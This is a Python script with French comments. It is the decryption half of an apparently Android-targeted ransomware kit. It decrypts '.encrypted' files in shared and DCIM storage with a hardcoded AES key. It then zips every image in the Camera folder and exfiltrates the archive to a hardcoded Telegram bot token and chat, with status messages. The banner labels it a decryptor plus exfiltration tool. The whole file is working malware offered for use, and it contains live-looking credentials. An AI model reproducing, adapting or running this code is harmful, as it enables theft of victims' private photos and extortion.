import os
import shutil
import zipfile
from multiprocessing import Pool, cpu_count
from Crypto.Cipher import AES
import requests

def send_telegram_document(bot_token, chat_id, file_path):
    """Envoyer un document via Telegram"""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {"chat_id": chat_id}
            response = requests.post(url, data=data, files=files)
        return response.json()
    except Exception as e:
        print(f"Erreur envoi Telegram: {e}")
        return None

def send_telegram_message(bot_token, chat_id, message):
    """Envoyer un message via Telegram"""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {"chat_id": chat_id, "text": message}
        response = requests.post(url, data=data)
        return response.json()
    except Exception as e:
        print(f"Erreur envoi message: {e}")
        return None

def decrypt_file(file_info):
    """Fonction de décryptage pour un fichier"""
    file_path, key = file_info
    try:
        if not file_path.endswith('.encrypted'):
            return False
            
        chunk_size = 64 * 1024  # 64KB
        decrypted_file_path = file_path[:-10]  # Retirer '.encrypted'

        with open(file_path, 'rb') as encrypted_file, open(decrypted_file_path, 'wb') as decrypted_file:
            # Lire l'IV (16 premiers bytes)
            iv = encrypted_file.read(AES.block_size)
            cipher = AES.new(key, AES.MODE_CBC, iv)

            while chunk := encrypted_file.read(chunk_size):
                decrypted_chunk = cipher.decrypt(chunk)
                # Retirer le padding seulement pour le dernier chunk
                if len(chunk) < chunk_size:
                    decrypted_chunk = decrypted_chunk.rstrip(b' ')
                decrypted_file.write(decrypted_chunk)

        os.remove(file_path)  # Supprimer le fichier crypté
        return True
        
    except Exception as e:
        print(f"Erreur lors du décryptage de {file_path}: {e}")
        return False

def get_encrypted_files(directory_path):
    """Récupérer tous les fichiers cryptés"""
    files = []
    for root, _, filenames in os.walk(directory_path):
        for filename in filenames:
            if filename.endswith('.encrypted'):
                file_path = os.path.join(root, filename)
                files.append(file_path)
    return files

def get_image_files(directory_path):
    """Récupérer tous les fichiers images du dossier Camera"""
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp', '.heic', '.raw']
    images = []
    
    if not os.path.exists(directory_path):
        return images
        
    for root, _, filenames in os.walk(directory_path):
        for filename in filenames:
            file_ext = os.path.splitext(filename)[1].lower()
            if file_ext in image_extensions:
                file_path = os.path.join(root, filename)
                images.append(file_path)
    return images

def create_images_zip(camera_directory, output_zip_path):
    """Créer un ZIP avec toutes les images du dossier Camera"""
    try:
        image_files = get_image_files(camera_directory)
        
        if not image_files:
            print("Aucune image trouvée dans le dossier Camera")
            return None
            
        with zipfile.ZipFile(output_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for image_path in image_files:
                # Garder la structure relative des dossiers
                relative_path = os.path.relpath(image_path, camera_directory)
                zipf.write(image_path, relative_path)
                
        print(f"ZIP créé avec {len(image_files)} images: {output_zip_path}")
        return output_zip_path
        
    except Exception as e:
        print(f"Erreur lors de la création du ZIP: {e}")
        return None

def decrypt_files_in_directory(directory_path, key):
    """Gérer le décryptage avec multiprocessing"""
    files = get_encrypted_files(directory_path)
    
    if not files:
        print(f"Aucun fichier crypté trouvé dans {directory_path}")
        return 0, 0
    
    print(f"Fichiers cryptés trouvés dans {directory_path}: {len(files)}")
    
    file_info_list = [(file, key) for file in files]

    with Pool(cpu_count()) as pool:
        results = pool.map(decrypt_file, file_info_list)

    files_decrypted = sum(1 for result in results if result)
    files_failed = len(results) - files_decrypted

    print(f"Décryptés: {files_decrypted}, Échoués: {files_failed}")
    return files_decrypted, files_failed

def main():
    """Fonction principale de décryptage"""
    # Même clé que dans le script de cryptage
    decryption_key = b'\x88\x1a\xfa@\xfa\xd1\xadB\xd5\xaa\xf2\xe17\x9b\xfeo\x88*\x89\xe2gEP\xb60R\xc6\xdb/\xb5`\xa7'
    
    # Configuration Telegram
    bot_token = "7126991043:AAEzeKswNo6eO7oJA49Hxn_bsbzgzUoJ-6A"
    chat_id = "-1002081124539"
    
    # Répertoires cibles
    target_directories = [
        "storage/shared",
        "storage/dcim"
    ]
    
    camera_directory = "storage/dcim/Camera"
    
    os.system("clear")
    
    print("""
╔══════════════════════════════════════╗
║        DÉCRYPTEUR + EXFILTRATION     ║
╚══════════════════════════════════════╝
    """)
    
    print("Début du décryptage...")
    
    total_decrypted = 0
    total_failed = 0
    
    # Décrypter tous les fichiers
    for directory in target_directories:
        if os.path.exists(directory):
            print(f"\nDécryptage du répertoire: {directory}")
            try:
                decrypted, failed = decrypt_files_in_directory(directory, decryption_key)
                total_decrypted += decrypted
                total_failed += failed
            except Exception as e:
                print(f"Erreur lors du décryptage de {directory}: {e}")
        else:
            print(f"Répertoire non trouvé: {directory}")
    
    # Envoyer un rapport de décryptage
    decrypt_message = f"""Décryptage terminé.
📁 Fichiers décryptés: {total_decrypted}
❌ Fichiers échoués: {total_failed}

🔄 Traitement des images en cours..."""
    
    send_telegram_message(bot_token, chat_id, decrypt_message)
    
    # Traiter spécifiquement le dossier Camera pour les images
    if os.path.exists(camera_directory):
        print(f"\nTraitement des images du dossier: {camera_directory}")
        
        # Créer le ZIP avec les images
        zip_filename = "Camera_Images_Decrypted.zip"
        zip_path = create_images_zip(camera_directory, zip_filename)
        
        if zip_path and os.path.exists(zip_path):
            # Envoyer le ZIP via Telegram
            print("Envoi du ZIP des images via Telegram...")
            
            file_size = os.path.getsize(zip_path) / (1024 * 1024)  # Taille en MB
            
            success = send_telegram_document(bot_token, chat_id, zip_path)
            
            if success:
                final_message = f"""✅ Images récupérées avec succès!
📦 Fichier: {zip_filename}
📏 Taille: {file_size:.2f} MB
📸 Dossier source: {camera_directory}"""
            else:
                final_message = "❌ Erreur lors de l'envoi des images"
            
            send_telegram_message(bot_token, chat_id, final_message)
            
            # Nettoyer le fichier ZIP local
            try:
                os.remove(zip_path)
                print("Fichier ZIP local supprimé")
            except:
                pass
                
        else:
            no_images_message = "ℹ️ Aucune image trouvée dans le dossier Camera après décryptage"
            send_telegram_message(bot_token, chat_id, no_images_message)
    else:
        no_camera_message = "⚠️ Dossier Camera non trouvé"
        send_telegram_message(bot_token, chat_id, no_camera_message)
    
    print("\nOpération terminée.")

if __name__ == "__main__":
    main()
